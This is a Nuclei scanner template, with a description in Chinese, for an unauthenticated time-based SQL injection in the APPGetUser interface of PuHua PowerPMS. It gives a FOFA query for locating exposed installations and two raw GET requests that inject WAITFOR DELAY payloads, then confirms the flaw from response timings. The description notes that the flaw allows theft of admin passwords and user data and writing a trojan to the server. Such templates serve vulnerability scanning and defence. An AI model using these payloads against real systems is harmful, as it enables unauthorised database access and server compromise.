id: PuHua-PowerPMS-APPGetUser-SQL

info:
  name: 普华-PowerPMS APPGetUser SQL注入
  author: HuanXiong
  severity: high
  description: |-
    fofa: app="普华科技-PowerPMS"
    普华-PowerPMS APPGetUser 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - 
  tags: SQL Injection

http:
  - raw:
      - |
        GET /APPAccount/APPGetUser?name=1%27%29%3BWAITFOR+DELAY+%270%3A0%3A4%27-- HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /APPAccount/APPGetUser?name=1%27%29%3BWAITFOR+DELAY+%270%3A0%3A8%27-- HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        name: SQL注入
        dsl:
          - 'status_code==200 && duration_1>=4 && duration_1<=5 && duration_2>=8 && duration_2<=9'